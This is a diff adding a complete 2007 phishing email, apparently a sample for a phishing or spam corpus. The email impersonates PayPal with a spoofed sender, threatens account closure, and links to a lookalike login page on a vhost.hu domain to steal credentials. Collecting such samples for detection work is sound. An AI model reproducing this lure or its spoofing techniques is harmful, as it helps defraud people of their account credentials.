@@ -1,0 +1,59 @@
+Return-Path: <Service@PayPal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 13776468ED
+	for <user@login.example.com>; Tue,  6 Mar 2007 20:32:06 -0500 (EST)
+Received: from mail.webxpress.hu:webxpress.hu (102.89.202.193.serverhosting.pnet.hu [193.202.89.102])
+	by mail.example.org (Postfix) with SMTP id 82B19131F716
+	for <user@example.com>; Tue,  6 Mar 2007 20:32:05 -0500 (EST)
+Received: (qmail 3928 invoked by uid 33); 7 Mar 2007 00:26:30 -0000
+Date: 7 Mar 2007 00:26:30 -0000
+Message-ID: <20070307002630.3927.qmail@mail.webxpress.hu:webxpress.hu>
+To: user@example.com
+Subject: Important notice : Please restore your Online Paypal
+Content-Type: text/HTML; charset="iso-8859-1"
+From: "PayPal" <Service@PayPal.com>
+Reply-To: "PayPal" <Service@PayPal.com>
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 936
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><META http-equiv="Content-Type" content="text/html; charset=utf-8"></head><body>
+
+<table height="380" cellspacing="0" cellpadding="0" width="654" border="0">
+  <tbody>
+    <tr></tr>
+    <tr>
+      <td width="164" height="57"><div align="left">
+      
+      <td width="490" height="57"><p>&nbsp;</p>
+      </td>
+    </tr>
+    <tr>
+      <td colspan="2">
+        <div align="justify">
+          <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Dear Customer,<br>
+            <br>
+          </strong></font>As part of our security measures, we regularly screen activity in the   PayPal system. We recently contacted you after noticing an issue on your   account.We requested information from you for the following reason: .</p>
+          <p align="left">Our system requires further account verification.</p>
+          <p align="left">Case ID Number: PP-184-703-194 </p>
+          <p align="left">Be sure to log in securely by clicking this link. Once you log in, you will be provided with steps to   restore your account access. We appreciate your understanding as we work to   ensure account safety.</p>
+          <p><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><span><font face="Verdana, Arial, Helvetica, sans-serif"><strong><font size="2"><span><a href="http://zmfhiv.s7.vhost.hu/www.paypal.com/cgi-bin/webscrcmd=_login-run/index.php" target="_blank">simply sign on from Account Services to Restore Your Account
+.
+</a></span></font></strong></font></span><br>
+            <br>
+          </font></p>
+        </div>
+        <p>In accordance with PayPal's User Agreement, your account access will   remain limited until the issue has been resolved. Unfortunately, if   access to your account remains limited for an extended period of time, it   may result in further limitations or eventual account closure. We   encourage you to log in to your PayPal account as soon as possible to help   avoid this.</p>
+        <p>To review your account and some or all of the information that PayPal   used to make its decision to limit your account access, please visit the   Resolution Center. If, after reviewing your account information, you   seek further clarification regarding your account access, please contact   PayPal by visiting the Help Center and clicking "Contact Us". </p>
+        <p>We thank you for your prompt attention to this matter. Please   understand that this is a security measure intended to help protect you and your   account. We apologize for any inconvenience. </p>
+        <p><br>
+        Sincerely,</p>
+        <p>PayPal Account Review Department</p>
+        <p>------------------------------------------------------------------------------------------------    </p>
+        <p>PayPal Email ID PP638 </p>
+      </html>
+
